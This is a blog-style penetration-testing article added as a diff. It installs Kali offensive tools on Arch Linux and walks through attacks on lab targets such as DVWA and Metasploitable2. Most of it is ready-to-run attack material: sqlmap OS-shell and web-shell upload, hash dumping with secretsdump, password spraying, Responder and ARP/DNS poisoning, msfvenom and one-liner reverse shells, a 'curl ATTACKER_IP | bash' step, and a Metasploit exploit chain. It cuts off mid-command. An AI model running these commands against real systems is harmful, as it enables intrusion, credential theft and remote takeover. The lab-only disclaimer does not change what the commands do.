@@ -1,0 +1,1341 @@
+---
+type: article
+title: OpenClaw — Full Kali-Grade Attack Operations
+tags: [OpenClaw, Arch Linux, Kali Tools]
+date: 2026-03-07
+author: Eno
+featuredImage: https://raw.githubusercontent.com/z0rs/z0rs.github.io/refs/heads/master/content/Images/OpenClaw-Kalilinux.png
+---
+
+## Arch Linux | All Kali Tools Installed + Full Attack Scenarios
+### Authorized Lab Environments Only: DVWA · Juice Shop · Metasploitable2
+
+> ⚠️ **ETHICAL CONSTRAINT:** Every technique, tool, and payload in this guide
+> is used EXCLUSIVELY against: your own Docker lab containers, local VMs,
+> CTF platforms, or systems with explicit written authorization.
+> Unauthorized use is illegal. OpenClaw enforces this.
+
+---
+
+## PART 0 — AUTO-INSTALLER
+### Install All Kali-Equivalent Tools on Arch Linux
+
+```bash
+#!/usr/bin/env bash
+# Kali-Grade Toolset Installer for Arch Linux
+# Run as your normal user (sudo will be invoked where needed)
+# Usage: bash openclaw_install_kali_tools.sh
+
+set -euo pipefail
+LOG="$HOME/ai-security-lab/logs/agent/kali_install_$(date +%Y%m%d_%H%M%S).log"
+mkdir -p "$(dirname "$LOG")"
+
+banner() { echo -e "\n\033[1;33m[OPENCLAW INSTALLER] $1\033[0m" | tee -a "$LOG"; }
+ok()     { echo -e "\033[1;32m[✓] $1\033[0m" | tee -a "$LOG"; }
+warn()   { echo -e "\033[1;33m[!] $1\033[0m" | tee -a "$LOG"; }
+
+# ────────────────────────────────────────────────
+# 1. PACMAN — Core Kali tools in official repos
+# ────────────────────────────────────────────────
+banner "Installing pacman packages (Kali-equivalent)..."
+sudo pacman -S --noconfirm --needed \
+  nmap masscan wireshark-qt \
+  nikto sqlmap hydra john hashcat \
+  aircrack-ng tcpdump netcat \
+  whois bind dnsutils \
+  smbclient \
+  exploitdb \
+  metasploit \
+  burpsuite \
+  gobuster \
+  wfuzz \
+  dirb \
+  socat \
+  proxychains-ng \
+  stunnel \
+  openssl \
+  net-tools iproute2 iputils \
+  p0f \
+  macchanger \
+  ncrack \
+  medusa \
+  crunch \
+  wordlists \
+  sslscan \
+  sslyze \
+  whatweb \
+  wafw00f \
+  smtp-user-enum \
+  onesixtyone \
+  snmpwalk \
+  ike-scan \
+  enum4linux \
+  nbtscan \
+  arping \
+  fping \
+  hping \
+  ettercap \
+  dsniff \
+  arpwatch \
+  mitmproxy \
+  impacket \
+  2>/dev/null || warn "Some pacman packages may not exist — skipping missing ones"
+ok "Pacman packages done"
+
+# ────────────────────────────────────────────────
+# 2. YAY — AUR Kali tools
+# ────────────────────────────────────────────────
+banner "Installing AUR packages via yay..."
+
+yay -S --noconfirm --needed \
+  wpscan \
+  droopescan \
+  joomscan \
+  dirsearch \
+  feroxbuster \
+  gobuster-bin \
+  evil-winrm \
+  crackmapexec \
+  smbmap \
+  enum4linux-ng \
+  dnsrecon \
+  fierce \
+  recon-ng \
+  theharvester \
+  sherlock \
+  social-engineer-toolkit \
+  beef-xss \
+  responder \
+  mitm6 \
+  chisel-bin \
+  ligolo-ng \
+  pwncat \
+  pixi \
+  davtest \
+  cadaver \
+  wkhtmltopdf \
+  apktool \
+  jadx \
+  ghidra \
+  radare2 \
+  gdb-peda \
+  pwndbg \
+  pwntools \
+  ltrace \
+  strace \
+  checksec \
+  2>/dev/null || warn "Some AUR packages unavailable — skipping"
+ok "AUR packages done"
+
+# ────────────────────────────────────────────────
+# 3. GO — ProjectDiscovery + other Go tools
+# ────────────────────────────────────────────────
+banner "Installing Go-based tools..."
+export PATH=$PATH:~/go/bin
+
+go_tools=(
+  "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+  "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
+  "github.com/projectdiscovery/httpx/cmd/httpx@latest"
+  "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
+  "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
+  "github.com/projectdiscovery/katana/cmd/katana@latest"
+  "github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest"
+  "github.com/projectdiscovery/asnmap/cmd/asnmap@latest"
+  "github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest"
+  "github.com/ffuf/ffuf/v2@latest"
+  "github.com/OJ/gobuster/v3@latest"
+  "github.com/lc/gau/v2/cmd/gau@latest"
+  "github.com/tomnomnom/waybackurls@latest"
+  "github.com/tomnomnom/gf@latest"
+  "github.com/tomnomnom/httprobe@latest"
+  "github.com/tomnomnom/unfurl@latest"
+  "github.com/tomnomnom/qsreplace@latest"
+  "github.com/hahwul/dalfox/v2@latest"
+  "github.com/jaeles-project/jaeles@latest"
+  "github.com/hakluke/hakrawler@latest"
+  "github.com/003random/getJS@latest"
+  "github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest"
+  "github.com/d3mondev/puredns/v2@latest"
+  "github.com/OWASP/Amass/v4/cmd/amass@latest"
+)
+
+for tool in "${go_tools[@]}"; do
+  name=$(basename "${tool%%@*}")
+  echo -n "  → $name ... "
+  go install -v "$tool" 2>/dev/null && echo "✓" || echo "skip"
+done
+ok "Go tools done"
+
+# ────────────────────────────────────────────────
+# 4. PIP — Python security tools
+# ────────────────────────────────────────────────
+banner "Installing Python tools..."
+pip install --break-system-packages --quiet \
+  impacket \
+  crackmapexec \
+  bloodhound \
+  ldapdomaindump \
+  certipy-ad \
+  pyinstaller \
+  pwntools \
+  ropper \
+  ROPgadget \
+  angr \
+  frida-tools \
+  objection \
+  scapy \
+  paramiko \
+  requests \
+  beautifulsoup4 \
+  lxml \
+  boto3 \
+  certipy-ad \
+  pypykatz \
+  secretsdump \
+  mitm6 \
+  dnslib \
+  2>/dev/null || warn "Some pip packages skipped"
+ok "Python tools done"
+
+# ────────────────────────────────────────────────
+# 5. GIT — Clone tool repos
+# ────────────────────────────────────────────────
+banner "Cloning tool repositories..."
+TOOLS_DIR="$HOME/ai-security-lab/tools"
+
+clone_tool() {
+  local name="$1" url="$2" dest="$TOOLS_DIR/$3"
+  if [[ ! -d "$dest" ]]; then
+    git clone --depth 1 "$url" "$dest" 2>/dev/null && ok "Cloned $name" || warn "Failed: $name"
+  else
+    ok "$name already cloned"
+  fi
+}
+
+clone_tool "LinPEAS/WinPEAS"    "https://github.com/carlospolop/PEASS-ng"              "exploitation/PEASS-ng"
+clone_tool "Impacket"           "https://github.com/fortra/impacket"                   "exploitation/impacket"
+clone_tool "BloodHound.py"      "https://github.com/dirkjanm/BloodHound.py"            "exploitation/bloodhound-py"
+clone_tool "Responder"          "https://github.com/lgandx/Responder"                  "network/Responder"
+clone_tool "PowerSploit"        "https://github.com/PowerShellMafia/PowerSploit"       "exploitation/PowerSploit"
+clone_tool "PayloadsAllThings"  "https://github.com/swisskyrepo/PayloadsAllTheThings"  "datasets/payloads/PayloadsAllTheThings"
+clone_tool "SecLists"           "https://github.com/danielmiessler/SecLists"           "datasets/wordlists/SecLists"
+clone_tool "FuzzDB"             "https://github.com/fuzzdb-project/fuzzdb"             "datasets/payloads/fuzzdb"
+clone_tool "AutoRecon"          "https://github.com/Tib3rius/AutoRecon"                "recon/AutoRecon"
+clone_tool "Ligolo-ng"          "https://github.com/nicocha30/ligolo-ng"               "network/ligolo-ng"
+clone_tool "Chisel"             "https://github.com/jpillora/chisel"                   "network/chisel"
+clone_tool "pwncat-cs"          "https://github.com/calebstewart/pwncat"               "exploitation/pwncat"
+clone_tool "CrackMapExec"       "https://github.com/Porchetta-Industries/CrackMapExec" "network/CrackMapExec"
+clone_tool "privilege-escalation-awesome-scripts" \
+                                "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" \
+                                "exploitation/privesc-scripts"
+ok "Repos cloned"
+
+# ────────────────────────────────────────────────
+# 6. msfvenom payload generation setup
+# ────────────────────────────────────────────────
+banner "Configuring Metasploit & msfvenom..."
+sudo systemctl start postgresql 2>/dev/null || true
+sudo msfdb init 2>/dev/null || warn "msfdb already initialized"
+ok "Metasploit ready"
+
+# ────────────────────────────────────────────────
+# 7. Add all go bins to PATH permanently
+# ────────────────────────────────────────────────
+banner "Setting up PATH..."
+grep -q 'go/bin' ~/.bashrc || echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
+grep -q 'ai-security-lab' ~/.bashrc || {
+  cat >> ~/.bashrc << 'BASHEOF'
+export PATH=$PATH:$HOME/go/bin
+export LAB="$HOME/ai-security-lab"
+export WORDLISTS="$HOME/ai-security-lab/tools/datasets/wordlists/SecLists"
+export PAYLOADS="$HOME/ai-security-lab/tools/datasets/payloads/PayloadsAllTheThings"
+alias kali-recon="$HOME/ai-security-lab/scripts/automation/full_recon.sh"
+alias kali-web="$HOME/ai-security-lab/scripts/automation/full_web_attack.sh"
+alias kali-msf="$HOME/ai-security-lab/scripts/automation/msf_attack.sh"
+alias openclaw-install="bash $HOME/ai-security-lab/scripts/automation/openclaw_install_kali_tools.sh"
+BASHEOF
+}
+source ~/.bashrc 2>/dev/null || true
+ok "PATH configured"
+
+banner "🦅 OpenClaw Kali-Grade Toolset Installation Complete!"
+echo "  Run: source ~/.bashrc"
+echo "  Then: openclaw"
+```
+
+Save this as `~/ai-security-lab/scripts/automation/openclaw_install_kali_tools.sh` and run it:
+
+```bash
+chmod +x ~/ai-security-lab/scripts/automation/openclaw_install_kali_tools.sh
+bash ~/ai-security-lab/scripts/automation/openclaw_install_kali_tools.sh
+```
+
+---
+
+## PART 1 — FULL RECONNAISSANCE CHAIN
+
+### 1.1 AutoRecon — Automated Multi-Phase Recon
+
+```bash
+# Install AutoRecon dependencies
+pip install --break-system-packages autorecon 2>/dev/null || \
+  pip install --break-system-packages \
+    git+https://github.com/Tib3rius/AutoRecon.git
+
+# Run AutoRecon against Metasploitable2
+sudo autorecon 192.168.56.101 \
+  --output ~/ai-security-lab/recon/autorecon/ \
+  --heartbeat 30
+
+# AutoRecon against DVWA
+sudo autorecon 127.0.0.1 \
+  --output ~/ai-security-lab/recon/autorecon-dvwa/ \
+  --single-target
+```
+
+### 1.2 TheHarvester — OSINT Recon
+
+```bash
+# Passive OSINT against your own domain
+theHarvester \
+  -d yourdomain.lab \
+  -b google,bing,linkedin,twitter,duckduckgo \
+  -l 200 \
+  -f ~/ai-security-lab/recon/theharvester_$(date +%Y%m%d).html
+
+# With all sources
+theHarvester -d yourdomain.lab -b all -l 500
+```
+
+### 1.3 DNSRecon + Fierce
+
+```bash
+# DNSRecon — full DNS enumeration
+dnsrecon \
+  -d yourtarget.lab \
+  -t std,brt,axfr,bing,yand,crt \
+  -D ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/DNS/namelist.txt \
+  --xml ~/ai-security-lab/recon/dns/dnsrecon_$(date +%Y%m%d).xml
+
+# Fierce — DNS scanner
+fierce --domain yourtarget.lab \
+  --wordlist ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt \
+  --output ~/ai-security-lab/recon/dns/fierce_$(date +%Y%m%d).txt
+
+# PureDNS — Mass DNS resolution
+puredns bruteforce \
+  ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
+  yourtarget.lab \
+  -r ~/resolvers.txt \
+  -w ~/ai-security-lab/recon/subdomains/puredns.txt
+```
+
+### 1.4 Katana — Web Crawler / Attack Surface
+
+```bash
+# Deep web crawl with Katana
+katana \
+  -u http://localhost:3000 \
+  -d 5 \
+  -jc \
+  -jsl \
+  -passive \
+  -o ~/ai-security-lab/recon/assets/katana_juiceshop.txt
+
+# Pipe to httpx to probe discovered URLs
+katana -u http://localhost -d 3 -silent | \
+  httpx -silent -status-code -title \
+  -o ~/ai-security-lab/recon/assets/crawled_urls.txt
+
+# GAU — Fetch known URLs from web archives
+gau --subs --providers wayback,commoncrawl,otx \
+  yourtarget.lab \
+  | tee ~/ai-security-lab/recon/assets/gau_urls.txt
+
+# Waybackurls
+echo "yourtarget.lab" | waybackurls | \
+  tee ~/ai-security-lab/recon/assets/wayback_urls.txt
+```
+
+---
+
+## PART 2 — WEB APPLICATION FULL ATTACK
+
+### 2.1 WhatWeb + WafW00f — Fingerprint Target
+
+```bash
+# Technology fingerprinting
+whatweb -v \
+  --log-verbose ~/ai-security-lab/scans/web-scans/whatweb.txt \
+  http://localhost \
+  http://localhost:3000 \
+  http://localhost:8080
+
+# WAF detection
+wafw00f http://localhost -a -o ~/ai-security-lab/scans/web-scans/waf.txt
+
+# SSLScan — TLS/SSL audit
+sslscan localhost:443 | \
+  tee ~/ai-security-lab/scans/web-scans/ssl_audit.txt
+
+# SSLyze — Detailed SSL analysis
+sslyze --regular localhost:443 \
+  --json_out ~/ai-security-lab/scans/web-scans/sslyze.json
+```
+
+### 2.2 Feroxbuster — Recursive Directory Brute Force
+
+```bash
+# Feroxbuster — fast recursive dir scan (better than gobuster for depth)
+feroxbuster \
+  --url http://localhost \
+  --wordlist ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt \
+  --extensions php,html,txt,bak,zip,old,conf,xml,json \
+  --threads 30 \
+  --depth 4 \
+  --filter-status 404 \
+  --output ~/ai-security-lab/scans/web-scans/feroxbuster_dvwa.txt
+
+# Against Juice Shop
+feroxbuster \
+  --url http://localhost:3000 \
+  --wordlist ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/Web-Content/api/objects.txt \
+  --extensions js,json \
+  --threads 20 \
+  --depth 3 \
+  --output ~/ai-security-lab/scans/web-scans/feroxbuster_juiceshop.txt
+```
+
+### 2.3 Dirsearch — Directory + File Discovery
+
+```bash
+# Dirsearch against DVWA
+dirsearch \
+  -u http://localhost \
+  -e php,html,txt,bak,sql,zip \
+  -t 20 \
+  --plain-text-report ~/ai-security-lab/scans/web-scans/dirsearch_dvwa.txt
+
+# Dirsearch against Juice Shop API
+dirsearch \
+  -u http://localhost:3000 \
+  -e js,json,html \
+  --wordlist ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
+  -t 15 \
+  --plain-text-report ~/ai-security-lab/scans/web-scans/dirsearch_juiceshop.txt
+```
+
+### 2.4 Dalfox — XSS Scanner (Advanced)
+
+```bash
+# Dalfox — automated XSS discovery on DVWA
+dalfox url \
+  "http://localhost/vulnerabilities/xss_r/?name=test" \
+  --cookie "PHPSESSID=YOUR_SESSION; security=low" \
+  --output ~/ai-security-lab/scans/web-scans/dalfox_xss.txt
+
+# Dalfox pipe mode — scan all URLs from crawl
+cat ~/ai-security-lab/recon/assets/katana_juiceshop.txt | \
+  grep "=" | \
+  dalfox pipe \
+  --output ~/ai-security-lab/scans/web-scans/dalfox_pipe.txt
+
+# XSS via FFUF parameter discovery first
+ffuf \
+  -u "http://localhost/page?FUZZ=test" \
+  -w ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
+  -mc 200 -fs 0 \
+  | tee ~/ai-security-lab/scans/web-scans/params_found.txt
+```
+
+### 2.5 WPScan — WordPress Audit
+
+```bash
+# WPScan against a WordPress target (if running in lab)
+# Start WordPress in Docker first:
+docker run -d -p 8888:80 --name wordpress \
+  -e WORDPRESS_DB_HOST=db -e WORDPRESS_DB_USER=wp \
+  -e WORDPRESS_DB_PASSWORD=wp -e WORDPRESS_DB_NAME=wordpress \
+  wordpress:latest
+
+# WPScan audit
+wpscan \
+  --url http://localhost:8888 \
+  --enumerate u,p,t,cb,dbe \
+  --plugins-detection aggressive \
+  --output ~/ai-security-lab/scans/web-scans/wpscan.txt
+
+# WPScan with API token (free at wpscan.com)
+wpscan \
+  --url http://localhost:8888 \
+  --api-token YOUR_TOKEN \
+  --enumerate vp \
+  --output ~/ai-security-lab/scans/web-scans/wpscan_full.txt
+```
+
+### 2.6 SQLMap — Advanced Injection
+
+```bash
+# ── Level 5 + Risk 3 (most aggressive, lab only) ──
+sqlmap \
+  -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
+  --level=5 --risk=3 \
+  --dbms=mysql \
+  --dbs \
+  --tables \
+  --dump-all \
+  --batch \
+  --threads=5 \
+  --random-agent \
+  --output-dir ~/ai-security-lab/scans/web-scans/sqlmap_full/
+
+# ── SQLMap — OS shell (if injection allows RCE) ──
+sqlmap \
+  -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
+  --os-shell \
+  --batch
+
+# ── SQLMap — Upload web shell ──
+sqlmap \
+  -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
+  --os-pwn \
+  --batch \
+  --msf-path /usr/share/metasploit-framework
+
+# ── Blind SQLi via time-based ──
+sqlmap \
+  -u "http://localhost/login.php" \
+  --data="username=admin&password=test&Login=Login" \
+  --technique=T \
+  --time-sec=5 \
+  --dbs --batch
+```
+
+### 2.7 Burp Suite — Manual Web Testing
+
+```bash
+# Launch Burp Suite (GUI)
+burpsuite &
+
+# OR via command line
+java -jar /usr/share/burpsuite/burpsuite.jar &
+
+# Intercept proxy — configure browser:
+# HTTP Proxy: 127.0.0.1:8080
+
+# Burp Suite + mitmproxy alternative (terminal):
+mitmproxy \
+  --listen-host 127.0.0.1 \
+  --listen-port 8080 \
+  --save-stream-file ~/ai-security-lab/scans/web-scans/traffic_$(date +%Y%m%d).mitm
+
+# Passive web analysis with mitmproxy in transparent mode:
+mitmdump \
+  -p 8080 \
+  -w ~/ai-security-lab/scans/web-scans/dump.mitm \
+  "~d localhost"
+```
+
+### 2.8 CRLFuzz — CRLF Injection Scanner
+
+```bash
+# CRLF injection scan
+crlfuzz \
+  -u "http://localhost" \
+  -o ~/ai-security-lab/scans/web-scans/crlf_findings.txt
+
+# Batch scan from URL list
+cat ~/ai-security-lab/recon/assets/katana_juiceshop.txt | \
+  crlfuzz -o ~/ai-security-lab/scans/web-scans/crlf_juiceshop.txt
+```
+
+---
+
+## PART 3 — NETWORK ATTACKS (METASPLOITABLE2)
+
+### 3.1 Impacket Suite — Network Protocol Attacks
+
+```bash
+# ── SMB: List shares without credentials ──
+python3 ~/ai-security-lab/tools/exploitation/impacket/examples/smbclient.py \
+  -no-pass \
+  //192.168.56.101/
+
+# ── SMB: Enumerate shares ──
+python3 ~/ai-security-lab/tools/exploitation/impacket/examples/smbmap.py \
+  -H 192.168.56.101 \
+  -u anonymous
+
+# ── GetNPUsers — AS-REP Roasting ──
+python3 ~/ai-security-lab/tools/exploitation/impacket/examples/GetNPUsers.py \
+  DOMAIN/ \
+  -usersfile ~/ai-security-lab/tools/datasets/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
+  -dc-ip 192.168.56.101 \
+  -no-pass \
+  -outputfile ~/ai-security-lab/scans/network/asrep_hashes.txt
+
+# ── secretsdump — Extract hashes remotely ──
+python3 ~/ai-security-lab/tools/exploitation/impacket/examples/secretsdump.py \
+  msfadmin:msfadmin@192.168.56.101
+
+# ── psexec — Remote code execution via SMB ──
+python3 ~/ai-security-lab/tools/exploitation/impacket/examples/psexec.py \
+  msfadmin:msfadmin@192.168.56.101
+
+# ── NTLM relay attack ──
+# (Lab only — requires two hosts)
+python3 ~/ai-security-lab/tools/exploitation/impacket/examples/ntlmrelayx.py \
+  -t 192.168.56.101 \
+  -smb2support \
+  --no-http-server
+```
+
+### 3.2 CrackMapExec — Network Sweep & Exploitation
+
+```bash
+# ── SMB sweep ──
+crackmapexec smb 192.168.56.0/24 \
+  --output ~/ai-security-lab/scans/network/cme_smb.txt
+
+# ── Password spray ──
+crackmapexec smb 192.168.56.101 \
+  -u ~/ai-security-lab/tools/datasets/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
+  -p ~/ai-security-lab/tools/datasets/wordlists/SecLists/Passwords/Common-Credentials/best110.txt \
+  --continue-on-success
+
+# ── Dump SAM ──
+crackmapexec smb 192.168.56.101 \
+  -u msfadmin -p msfadmin \
+  --sam
+
+# ── Execute command ──
+crackmapexec smb 192.168.56.101 \
+  -u msfadmin -p msfadmin \
+  -x "id && whoami"
+
+# ── SSH sweep ──
+crackmapexec ssh 192.168.56.101 \
+  -u msfadmin -p msfadmin \
+  -x "uname -a"
+```
+
+### 3.3 Responder — LLMNR/NBT-NS Poisoning
+
+```bash
+# ── Start Responder on lab network interface ──
+# Find your lab interface first:
+ip link show | grep -E "docker|eth|ens|enp"
+
+# Run Responder (captures NTLMv2 hashes)
+sudo python3 ~/ai-security-lab/tools/network/Responder/Responder.py \
+  -I docker0 \
+  -rdwv \
+  2>&1 | tee ~/ai-security-lab/scans/network/responder_$(date +%Y%m%d).log
+
+# Crack captured hashes with hashcat
+hashcat \
+  -m 5600 \
+  ~/ai-security-lab/tools/network/Responder/logs/Responder-Session.log \
+  ~/ai-security-lab/tools/datasets/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt \
+  -o ~/ai-security-lab/scans/network/responder_cracked.txt
+```
+
+### 3.4 Enum4linux-ng — SMB/NetBIOS Enumeration
+
+```bash
+# Full SMB enumeration
+enum4linux-ng \
+  -A \
+  -oJ ~/ai-security-lab/scans/network/enum4linux_$(date +%Y%m%d).json \
+  192.168.56.101
+
+# Verbose output
+enum4linux-ng -A -v 192.168.56.101 | \
+  tee ~/ai-security-lab/scans/network/enum4linux.txt
+```
+
+### 3.5 SMBMap — Share Permissions
+
+```bash
+# List shares + permissions
+smbmap -H 192.168.56.101
+
+# Authenticated enumeration
+smbmap \
+  -H 192.168.56.101 \
+  -u msfadmin \
+  -p msfadmin \
+  -R \
+  --output ~/ai-security-lab/scans/network/smbmap.txt
+
+# Upload file via SMB
+smbmap \
+  -H 192.168.56.101 \
+  -u msfadmin \
+  -p msfadmin \
+  --upload /tmp/test.txt \
+  'tmp/test.txt'
+
+# Download file via SMB
+smbmap \
+  -H 192.168.56.101 \
+  -u msfadmin \
+  -p msfadmin \
+  --download 'tmp/passwords.txt'
+```
+
+### 3.6 Mitmproxy / ARP Poisoning (Lab Only)
+
+```bash
+# ── Enable IP forwarding ──
+sudo sysctl net.ipv4.ip_forward=1
+
+# ── ARP poison with ettercap (lab internal) ──
+sudo ettercap \
+  -T \
+  -q \
+  -i docker0 \
+  -M arp:remote \
+  /192.168.56.101// \
+  /192.168.56.1// \
+  -w ~/ai-security-lab/scans/network/arp_capture.pcap
+
+# ── DNS spoof with dsniff ──
+# Create dns.conf first:
+cat > /tmp/dns.conf << 'EOF'
+*.lab A 192.168.56.1
+EOF
+sudo dnsspoof -i docker0 -f /tmp/dns.conf
+
+# ── SSL stripping with mitmproxy ──
+sudo mitmproxy \
+  --mode transparent \
+  --listen-host 0.0.0.0 \
+  --listen-port 8080
+```
+
+---
+
+## PART 4 — EXPLOITATION & PAYLOADS
+
+### 4.1 msfvenom — Payload Generation
+
+```bash
+# ── Linux reverse shell ELF ──
+msfvenom \
+  -p linux/x64/shell_reverse_tcp \
+  LHOST=127.0.0.1 \
+  LPORT=4444 \
+  -f elf \
+  -o ~/ai-security-lab/tools/exploitation/payloads/linux_revshell.elf
+
+# ── PHP web shell ──
+msfvenom \
+  -p php/meterpreter/reverse_tcp \
+  LHOST=127.0.0.1 \
+  LPORT=4444 \
+  -f raw \
+  -o ~/ai-security-lab/tools/exploitation/payloads/shell.php
+
+# ── Python reverse shell ──
+msfvenom \
+  -p cmd/unix/reverse_python \
+  LHOST=127.0.0.1 \
+  LPORT=4444 \
+  -f raw \
+  -o ~/ai-security-lab/tools/exploitation/payloads/revshell.py
+
+# ── Bash reverse shell ──
+msfvenom \
+  -p cmd/unix/reverse_bash \
+  LHOST=127.0.0.1 \
+  LPORT=4444 \
+  -f raw \
+  -o ~/ai-security-lab/tools/exploitation/payloads/revshell.sh
+
+# ── Staged Meterpreter (Linux x64) ──
+msfvenom \
+  -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=127.0.0.1 \
+  LPORT=4444 \
+  -f elf \
+  -e x64/xor_dynamic \
+  -i 10 \
+  -o ~/ai-security-lab/tools/exploitation/payloads/meterpreter.elf
+
+chmod +x ~/ai-security-lab/tools/exploitation/payloads/*.elf
+```
+
+### 4.2 Manual Reverse Shells
+
+```bash
+# ── Start listener ──
+nc -lvnp 4444
+
+# ── OR pwncat-cs listener (more powerful) ──
+python3 ~/ai-security-lab/tools/exploitation/pwncat/pwncat_cs \
+  -lp 4444
+
+# ── Bash reverse shell one-liners ──
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+exec 5<>/dev/tcp/127.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# ── Python reverse shell ──
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# ── Netcat reverse shell ──
+nc -e /bin/bash 127.0.0.1 4444
+
+# ── Socat (encrypted reverse shell) ──
+# On attacker (listener):
+socat \
+  OPENSSL-LISTEN:4444,cert=/tmp/cert.pem,verify=0,fork \
+  EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# On target:
+socat \
+  OPENSSL:127.0.0.1:4444,verify=0 \
+  EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# ── Upgrade TTY to fully interactive shell ──
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Then: CTRL+Z
+stty raw -echo; fg
+export TERM=xterm; stty rows 40 cols 160
+```
+
+### 4.3 Chisel — Port Forwarding & Tunneling
+
+```bash
+# ── Build Chisel if not installed ──
+cd ~/ai-security-lab/tools/network/chisel
+go build -ldflags="-s -w" . 2>/dev/null || true
+
+# ── Chisel server (on attacker) ──
+./chisel server \
+  --reverse \
+  --port 9000 \
+  --auth openclaw:password
+
+# ── Chisel client (on target — forwards target's internal port 80 to attacker's 8888) ──
+./chisel client \
+  --auth openclaw:password \
+  127.0.0.1:9000 \
+  R:8888:127.0.0.1:80
+
+# ── SOCKS5 proxy via Chisel ──
+# Server:
+./chisel server --reverse --port 9000
+
+# Client:
+./chisel client 127.0.0.1:9000 R:1080:socks
+
+# Now route all traffic through proxy:
+sudo tee /etc/proxychains4.conf << 'EOF'
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+
+# Use proxychains
+proxychains nmap -sT -Pn 10.10.10.1
+proxychains curl http://internal-target
+```
+
+### 4.4 Privilege Escalation with LinPEAS
+
+```bash
+# ── Copy LinPEAS to target via web server ──
+# Host from attacker:
+cd ~/ai-security-lab/tools/exploitation/PEASS-ng/linPEAS/
+python3 -m http.server 8888
+
+# Download & run on target:
+curl http://ATTACKER_IP:8888/linpeas.sh | bash | \
+  tee /tmp/linpeas_output.txt
+
+# Manual privesc checks
+sudo -l                                              # sudo rights
+find / -perm -4000 2>/dev/null                       # SUID files
+find / -perm -2000 2>/dev/null                       # SGID files
+cat /etc/crontab; ls /etc/cron*                      # cron jobs
+ss -tlnp                                             # open services
+cat ~/.bash_history                                  # command history
+find / -writable -type f 2>/dev/null | grep -v proc  # writable files
+```
+
+---
+
+## PART 5 — METASPLOIT FULL ATTACK CHAIN
+
+### 5.1 Complete MSF Session Against Metasploitable2
+
+```bash
+# ─────────────────────────────────────────────────────
+# Full Metasploit attack script (resource file)
+# Save and run: msfconsole -r openclaw_msf_attack.rc
+# ─────────────────────────────────────────────────────
+
+cat > ~/ai-security-lab/scripts/automation/openclaw_msf_attack.rc << 'MSFEOF'
+# OpenClaw Metasploit Full Attack Chain
+# Target: Metasploitable2 @ 192.168.56.101
+
+# ── Phase 1: Service scan ──
+db_nmap -sV -sC -O -p- 192.168.56.101 --min-rate 1000
+
+# ── Phase 2: Check discovered vulns ──
+vulns
+
+# ── Phase 3: Exploit VSFTPD backdoor ──
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+set RPORT 21
+run -j
+
+# ── Phase 4: Exploit Samba RCE ──
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set PAYLOAD cmd/unix/reverse_netcat
+set LPORT 5555
+run -j
+
+# ── Phase 5: UnrealIRCd backdoor ──
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set LPORT 5556
+run -j
+
+# ── Phase 6: Java RMI exploit ──
+use exploit/multi/misc/java_rmi_server
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set PAYLOAD java/meterpreter/reverse_tcp
+set LPORT 5557
+run -j
+
+# ── Phase 7: Tomcat manager ──
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.56.101
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set LHOST 192.168.56.1
+set PAYLOAD java/meterpreter/reverse_tcp
+set LPORT 5558
+run -j
+
+# ── Phase 8: Distcc exploit ──
+use exploit/unix/misc/distcc_exec
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set LPORT 5559
+run -j
+
+# ── List sessions ──
+sessions
+
+# ── Select first session and enumerate ──
+sessions -i 1
+MSFEOF
+
+# Run the resource file
+msfconsole -q -r ~/ai-security-lab/scripts/automation/openclaw_msf_attack.rc | \
+  tee ~/ai-security-lab/logs/scans/msf_attack_$(date +%Y%m%d).log
+```
+
+---
+
+## PART 6 — NETWORK PROTOCOL ATTACKS
+
+### 6.1 SNMP Enumeration
+
+```bash
+# ── SNMP walk (community string: public) ──
+snmpwalk \
+  -v2c \
+  -c public \
+  192.168.56.101 \
+  | tee ~/ai-security-lab/scans/network/snmp_walk.txt
+
+# ── SNMP community string brute force ──
+onesixtyone \
